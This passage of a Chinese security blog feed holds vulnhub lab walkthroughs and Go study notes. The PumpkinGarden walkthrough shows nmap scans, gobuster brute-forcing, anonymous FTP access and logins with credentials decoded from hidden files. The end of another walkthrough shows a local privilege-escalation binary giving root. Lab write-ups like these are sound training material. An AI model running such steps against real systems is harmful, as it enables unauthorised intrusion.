class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ConverterPlus:/tmp$ ./exploit<br>./exploit<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:b3:82:58 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.150/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1479sec preferred_lft 1479sec<br>    inet6 fe80::5600:6317:eab4:21f7/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux ConverterPlus 4.15.0-142-generic <span class="hljs-comment">#146~16.04.1-Ubuntu SMP Tue Apr 13 09:26:57 UTC 2021 i686 athlon i686 GNU/Linux</span><br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 32K<br>262146 drwx------  5 root root 4.0K Sep 11  2017 .<br>     2 drwxr-xr-x 23 root root 4.0K Sep 12 06:51 ..<br>268875 -rw-------  1 root root    5 Sep 11  2017 .bash_history<br>262239 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br>262238 drwx------  2 root root 4.0K Aug  1  2017 .cache<br>548735 drwx------  3 root root 4.0K Sep 11  2017 .gnupg<br>548793 drwxr-xr-x  2 root root 4.0K Sep  9  2017 .nano<br>262240 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br></code></pre></td></tr></table></figure><p>结束战斗</p><p>补充提权的问题 <a href="https://reigniting.github.io/2023/04/08/%E9%9D%B6%E6%9C%BAH-A-S-T-E-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/#more">靶机H.A.S.T.E: 1渗透记录 | 各种write up (reigniting.github.io)</a></p><p><img src="/pic/c0597ba972ecf65b0a5d6c1c0b97ac54_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Go 基础</title>
    <link href="/2023/09/903b9c960867.html"/>
    <url>/2023/09/903b9c960867.html</url>
    
    <content type="html"><![CDATA[<h1 id="Go-基础"><a href="#Go-基础" class="headerlink" title="Go 基础"></a>Go 基础</h1><p>太久不用，很多语法已经忘完了，这里简单记录一下基础语法。</p><p>不定参数与其传递</p><p><img src="/pic/af015e152afcaa7df02545f9048bc267_MD5.png"></p><p>函数类型</p><p><img src="/pic/548f4e8f43c5ae2e1c3a1c4a818a53f8_MD5.png"></p><p>闭包：就是一个函数“捕获”了和它在同一作用域的其它常量和变量。它不关心这些捕获了的变量和常量是否已经超出了作用域，所以只有闭包还在使用它，这些变量就还会存在</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>   a := <span class="hljs-string">&quot;1&quot;</span>  <br>   b := <span class="hljs-number">1</span>  <br>   <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>      a = <span class="hljs-string">&quot;2&quot;</span>  <br>      b = <span class="hljs-number">2</span>  <br>   &#125;()  <br>   fmt.Printf(<span class="hljs-string">&quot;%s,%d&quot;</span>, a, b) <br>   <span class="hljs-comment">//2,2</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果一个函数中有多个 defer 语句，它们会以 LIFO（后进先出）的顺序执行</p><p>当一个包被导入时，如果该包还导入了其它的包，那么会先将其它包导入进来，然后再对这些包中的包级常量和变量进行初始化，接着执行 init 函数（如果有的话）</p><p><img src="/pic/7e4a1db7595a4971ef9c30b9ad4c9a94_MD5.png"></p><p>指针</p><p>表达式 new(T)将创建一个 T 类型的匿名变量，所做的是为 T 类型的新值分配并清零一块内存空间，然后将这块内存空间的地址作为结果返回，而这个结果就是指向这个新的 T 类型值的指针值，返回的指针类型为*T</p><p>我们只需使用 new()函数，无需担心其内存的生命周期或怎样将其删除，因为 Go 语言的内存管理系统会帮我们打理一切。</p><p>内置函数 len(长度) 和 cap(容量) 都返回数组⻓度 (元素数量)</p><p>在函数之间传递变量时，总是以值的方式传递的</p><p>slice 并不是真正意义上的动态数组，而是一个引用类型。slice 总是指向一个底层 array。想获取 slice 的副本可以使用 copy 命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">//数组</span><br>a := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br><span class="hljs-comment">//切片</span><br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br><span class="hljs-comment">//var s3 []T = make([]T, length, capacity) capacity 省略，则和 length 的值相同</span><br></code></pre></td></tr></table></figure><p>map 是无序的，我们无法决定它的返回顺序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//判断某个 key 所对应的 value 是否存在</span><br>value, ok := m1[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">delete</span>(m1, <span class="hljs-number">2</span>) <span class="hljs-comment">//删除 key 值为 3 的 map</span><br><br><span class="hljs-comment">//在函数间传递映射并不会制造出该映射的一个副本，不是值传递，而是引用传递</span><br><br></code></pre></td></tr></table></figure><p>如果想修改接收者的值，只能将指针作为接收者</p><p><img src="/pic/13855b4ca6ce6413757add47d666e510_MD5.png"></p><p>方法值和方法表达式</p><p><img src="/pic/20113211900779e2202c5cd290c9ac68_MD5.png"></p><p>多态是通过接口来是实现的</p><p><img src="/pic/79e0aeae32218acf650b58dbb5809a39_MD5.png"></p><p>空接口</p><p><img src="/pic/d730d9a4f6c220bb4dd4e4b081e20af3_MD5.png"></p><p>判断类型的断言</p><p><img src="/pic/f8adaee3b599d7f0376cec5bdd707116_MD5.png"></p><p>按空格分割</p><p><img src="/pic/f033f7b47ea344fe46cfa9fc89565360_MD5.png"></p><p>goroutine 奉行通过通信来共享内存，而不是共享内存来通信</p><p>引⽤类型 channel 是 CSP 模式的具体实现，用于多个 goroutine 通讯。其内部实现了同步，确保并发安全</p><h2 id="Go-语言核心-36-讲"><a href="#Go-语言核心-36-讲" class="headerlink" title="Go 语言核心 36 讲"></a>Go 语言核心 36 讲</h2><h3 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h3><p>一些资源：</p><ul><li><a href="https://github.com/hyper0x/go_command_tutorial">hyper0x&#x2F;go_command_tutorial: Golang command tutorial in Chinese. (github.com)</a></li><li><a href="https://golang.google.cn/ref/spec">The Go Programming Language Specification - The Go Programming Language (google.cn)</a></li><li><a href="https://github.com/hyper0x/Golang_Puzzlers">hyper0x&#x2F;Golang_Puzzlers: An example project, for my column named “Core Golang - 36 lessons” (github.com)</a></li></ul><p><img src="/pic/9f5dcaff9cd7cce414e4a1ce198bf6f.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>Go</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PumpkinGarden 靶机</title>
    <link href="/2023/09/4f14f7be4ea4.html"/>
    <url>/2023/09/4f14f7be4ea4.html</url>
    
    <content type="html"><![CDATA[<h1 id="PumpkinGarden-靶机"><a href="#PumpkinGarden-靶机" class="headerlink" title="PumpkinGarden 靶机"></a>PumpkinGarden 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.141                                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 05:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.00022s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>1515/tcp open  ifor-protocol<br>3535/tcp open  ms-la<br>MAC Address: 08:00:27:20:A9:84 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放了21, 1515, 3535 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ sudo nmap -sT -sV -sC -O -p21,1515,3535 192.168.56.141<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 05:42 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.00048s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to 192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.2 - secure, fast, stable<br>|_End of status<br>1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Mission-Pumpkin<br>3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 d8:8d:e7:48:3a:3c:91:0e:3f:43:ea:a3:05:d8:89:e2 (DSA)<br>|   2048 f0:41:8f:e0:40:e3:c0:3a:1f:4d:4f:93:e6:63:24:9e (RSA)<br>|   256 fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1 (ECDSA)<br>|_  256 fa:e8:42:5a:88:91:b4:4b:eb:e4:c3:74:2e:23:a5:45 (ED25519)<br>MAC Address: 08:00:27:20:A9:84 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>FTP 允许匿名登录，1515 是 Web 服务端口，3535 是 ssh 端口，Ubuntu 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ sudo nmap --script=vuln -p21,1515,3535 192.168.56.141 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 05:45 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.00050s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>1515/tcp open  ifor-protocol<br>3535/tcp open  ms-la<br>MAC Address: 08:00:27:20:A9:84 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>漏洞脚本扫描没结果，接下来看看 ftp 匿名登录后的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ ftp 192.168.56.141<br>Connected to 192.168.56.141.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.141:kali): anonymous</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; binary</span><br><span class="hljs-string">200 Switching to Binary mode.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||12463|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; get note.txt</span><br><span class="hljs-string">local: note.txt remote: note.txt</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||54151|).</span><br><span class="hljs-string">150 Opening BINARY mode data connection for note.txt (88 bytes).</span><br><span class="hljs-string">100% |***********************************************************************|    88       42.50 KiB/s    00:00 ETA</span><br><span class="hljs-string">226 Transfer complete.</span><br><span class="hljs-string">88 bytes received in 00:00 (34.22 KiB/s)</span><br><span class="hljs-string">ftp&gt; pwd</span><br><span class="hljs-string">Remote directory: /</span><br><span class="hljs-string">ftp&gt; ls -liah</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||54091|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">drwxr-xr-x    2 0        113          4096 Jun 11  2019 .</span><br><span class="hljs-string">drwxr-xr-x    2 0        113          4096 Jun 11  2019 ..</span><br><span class="hljs-string">-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; exit</span><br><span class="hljs-string">421 Timeout.</span><br></code></pre></td></tr></table></figure><p>下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ <span class="hljs-built_in">cat</span> note.txt                                        <br>Hello Dear! <br>Looking <span class="hljs-keyword">for</span> route map to PumpkinGarden? I think jack can <span class="hljs-built_in">help</span> you find it.<br></code></pre></td></tr></table></figure><p>获得了一个用户名 jack，还提到了网站路径地图？不过没有更多信息了</p><h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p>看一看 web 服务界面。</p><p><img src="/pic/c83e4188cf5fc267db28b775c54251f7_MD5.png"></p><p>页面看起来并没有特别之处，加粗的先留存记录一下，hood 这个单词作为路径试试也是 404，看看网页源代码</p><p><img src="/pic/73794daffbce16fd082b90fefdaad7f9_MD5.png"></p><p>提到了 img 目录，边查看 img 目录边爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.141:1515/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,sql,tar,php<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.141:1515/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              txt,html,sql,tar,php<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/12 06:50:46 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 287]<br>/.html                (Status: 403) [Size: 288]<br>/index.html           (Status: 200) [Size: 903]<br>/img                  (Status: 301) [Size: 320] [--&gt; http://192.168.56.141:1515/img/]<br>/.html                (Status: 403) [Size: 288]<br>/.php                 (Status: 403) [Size: 287]<br>/server-status        (Status: 403) [Size: 296]<br>Progress: 1321045 / 1323366 (99.82%)<br>===============================================================<br>2023/09/12 06:54:28 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>爆破没结果，&#x2F;img 页面直接查看倒是有意外之喜</p><p><img src="/pic/077b19f542061ce6f18f614817d1e502_MD5.png"></p><p>进入 <code>hidden_secret/</code> 查看，有个文件，打开发现</p><p><img src="/pic/c67815a1afe50d439d322b46d3e700ad_MD5.png"></p><p>尝试一下解码</p><p><img src="/pic/c89cd6fc940c1585118f2a86e7ec62df_MD5.png"></p><p>没想到 base64 直接解码成功了</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">scarecrow</span> : 5Qn@<span class="hljs-variable">$y</span><br></code></pre></td></tr></table></figure><h2 id="ftp-用户登录"><a href="#ftp-用户登录" class="headerlink" title="ftp 用户登录"></a>ftp 用户登录</h2><p>试着用这个口令登录 ftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ ftp 192.168.56.141<br>Connected to 192.168.56.141.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.141:kali): scarecrow</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; binary</span><br><span class="hljs-string">200 Switching to Binary mode.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||64848|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">-rw-r--r--    1 0        0             167 Jun 11  2019 note.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; get note.txt</span><br><span class="hljs-string">local: note.txt remote: note.txt</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||39844|).</span><br><span class="hljs-string">150 Opening BINARY mode data connection for note.txt (167 bytes).</span><br><span class="hljs-string">100% |***********************************************************************|   167       77.62 KiB/s    00:00 ETA</span><br><span class="hljs-string">226 Transfer complete.</span><br><span class="hljs-string">167 bytes received in 00:00 (59.41 KiB/s)</span><br><span class="hljs-string">ftp&gt; exit</span><br><span class="hljs-string">221 Goodbye.</span><br></code></pre></td></tr></table></figure><p>查看下载的 <code>note.txt</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ <span class="hljs-built_in">cat</span> note.txt                                        <br><br>Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! <br>Reach out to goblin and share this <span class="hljs-string">&quot;Y0n<span class="hljs-variable">$M4sy3D1t</span>&quot;</span> to secretly get keys from LordPumpkin.<br></code></pre></td></tr></table></figure><p>猜测这里的 goblin 是用户名，这样又得到了一个口令，尝试登录ftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ ftp 192.168.56.141<br>Connected to 192.168.56.141.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.141:kali): goblin</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; ls -liah</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||26945|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">drwx------    2 1002     1002         4096 Jun 13  2019 .</span><br><span class="hljs-string">drwxr-xr-x    5 0        0            4096 Jun 11  2019 ..</span><br><span class="hljs-string">-rw-------    1 1002     1002           32 Jun 11  2019 .bash_history</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002          231 Jun 11  2019 .bash_logout</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002         3637 Jun 11  2019 .bashrc</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002          675 Jun 11  2019 .profile</span><br><span class="hljs-string">-rw-r--r--    1 0        0             328 Jun 11  2019 note</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; pwd</span><br><span class="hljs-string">Remote directory: /home/goblin</span><br><span class="hljs-string">ftp&gt; get .bash_history</span><br><span class="hljs-string">local: .bash_history remote: .bash_history</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||20033|).</span><br><span class="hljs-string">150 Opening BINARY mode data connection for .bash_history (32 bytes).</span><br><span class="hljs-string">100% |***********************************************************************|    32       16.19 KiB/s    00:00 ETA</span><br><span class="hljs-string">226 Transfer complete.</span><br><span class="hljs-string">32 bytes received in 00:00 (10.47 KiB/s)</span><br><span class="hljs-string">ftp&gt; cd note</span><br><span class="hljs-string">550 Failed to change directory.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||19069|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">-rw-r--r--    1 0        0             328 Jun 11  2019 note</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; get note</span><br><span class="hljs-string">local: note remote: note</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||48158|).</span><br><span class="hljs-string">150 Opening BINARY mode data connection for note (328 bytes).</span><br><span class="hljs-string">100% |***********************************************************************|   328      449.87 KiB/s    00:00 ETA</span><br><span class="hljs-string">226 Transfer complete.</span><br><span class="hljs-string">328 bytes received in 00:00 (257.27 KiB/s)</span><br><span class="hljs-string">ftp&gt; cd /var/www/html</span><br><span class="hljs-string">421 Timeout.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">Not connected.</span><br><span class="hljs-string">ftp&gt; exit</span><br></code></pre></td></tr></table></figure><p>将下载的两个文件进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ <span class="hljs-built_in">cat</span> .bash_history <br><span class="hljs-built_in">cd</span><br>clear<br>sudo su<br>sudo namp<br><span class="hljs-built_in">exit</span><br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ <span class="hljs-built_in">cat</span> note         <br><br>Hello Friend! I heard that you are looking <span class="hljs-keyword">for</span> PumpkinGarden key. <br>But Key to the garden will be with LordPumpkin(ROOT user), don\<span class="hljs-string">&#x27;t worry, I know where LordPumpkin had placed the Key.</span><br><span 